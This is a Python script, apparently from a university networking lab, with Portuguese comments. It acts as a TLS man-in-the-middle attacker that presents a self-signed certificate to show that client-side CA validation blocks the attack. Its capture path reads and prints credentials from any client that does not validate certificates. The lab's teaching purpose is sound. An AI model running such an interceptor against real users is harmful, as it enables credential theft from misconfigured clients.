#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MITM com interceptação TLS (ATACANTE) — Fase 3 (Laboratório de Redes / PUCRS).

Demonstra que a autenticação por certificado DETECTA o ataque da Fase 2.

Na Fase 2, o proxy repassava bytes em texto claro e reescrevia mensagens. Para
fazer o mesmo contra o serviço protegido, o atacante teria que TERMINAR o TLS
(se passar pelo servidor) e reabri-lo para o servidor real. Mas, para terminar o
TLS, ele precisa apresentar um certificado para 'servidor-auth' — e ele só tem
um certificado AUTO-ASSINADO (atacante.crt), que a CA do cliente NÃO reconhece.

Resultado: no handshake, o cliente valida o certificado, vê que não foi assinado
pela CA confiável e ABORTA a conexão (ssl.SSLCertVerificationError). O atacante
NUNCA recebe a credencial. Este script mostra o lado do atacante registrando a
tentativa fracassada.

Uso:
  python3 mitm_tls_intercept.py --escuta 0.0.0.0:5050 \\
      --servidor 10.0.0.20:5050 \\
      --cert certs/atacante.crt --chave certs/atacante.key
"""
import argparse
import os
import socket
import ssl
from datetime import datetime


def agora() -> str:
    return datetime.now().strftime("%H:%M:%S")


def hostporta(texto: str, porta_padrao: str):
    if ":" in texto:
        host, porta = texto.rsplit(":", 1)
        return (host or porta_padrao), int(porta)
    return porta_padrao, int(texto)


def main() -> None:
    aqui = os.path.dirname(os.path.abspath(__file__))
    parser = argparse.ArgumentParser(
        description="MITM com interceptacao TLS (certificado de atacante) — Fase 3.")
    parser.add_argument("--escuta", default="0.0.0.0:5050")
    parser.add_argument("--servidor", required=True,
                        help="servidor real (host:porta), para onde o atacante "
                             "tentaria repassar se conseguisse terminar o TLS")
    parser.add_argument("--cert", default=os.path.join(aqui, "certs", "atacante.crt"))
    parser.add_argument("--chave", default=os.path.join(aqui, "certs", "atacante.key"))
    args = parser.parse_args()

    host_e, porta_e = hostporta(args.escuta, "0.0.0.0")
    srv_host, srv_porta = hostporta(args.servidor, "127.0.0.1")

    contexto = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    contexto.load_cert_chain(certfile=args.cert, keyfile=args.chave)

    escuta = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    escuta.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    escuta.bind((host_e, porta_e))
    escuta.listen(16)

    print(f"[{agora()}] MITM-TLS escutando em {host_e}:{porta_e} "
          f"(se passando por {srv_host}:{srv_porta})")
    print(f"[{agora()}] apresentando certificado de ATACANTE: {args.cert}")
    print(f"[{agora()}] (esperado: o cliente valida a CA e RECUSA a conexao)")

    try:
        while True:
            bruto, addr = escuta.accept()
            print(f"\n[{agora()}] + cliente {addr[0]}:{addr[1]} conectou; "
                  f"iniciando handshake TLS falso...")
            try:
                conexao = contexto.wrap_socket(bruto, server_side=True)
                # Se chegou aqui, o cliente NÃO validou o certificado (inseguro).
                print(f"[{agora()}]   !!! handshake CONCLUIDO — cliente NAO "
                      f"validou o certificado (configuracao insegura).")
                dados = conexao.recv(4096)
                print(f"[{agora()}]   credencial capturada: {dados!r}")
                conexao.close()
            except ssl.SSLError as exc:
                # Caminho esperado: o cliente abortou ao validar o certificado.
                print(f"[{agora()}]   handshake FALHOU: o cliente recusou o "
                      f"certificado de atacante.")
                print(f"[{agora()}]   detalhe TLS: {exc}")
                print(f"[{agora()}]   >>> ATAQUE NEUTRALIZADO: a credencial NAO "
                      f"foi enviada.")
                bruto.close()
    except KeyboardInterrupt:
        print(f"\n[{agora()}] encerrando MITM-TLS...")
    finally:
        escuta.close()


if __name__ == "__main__":
    main()
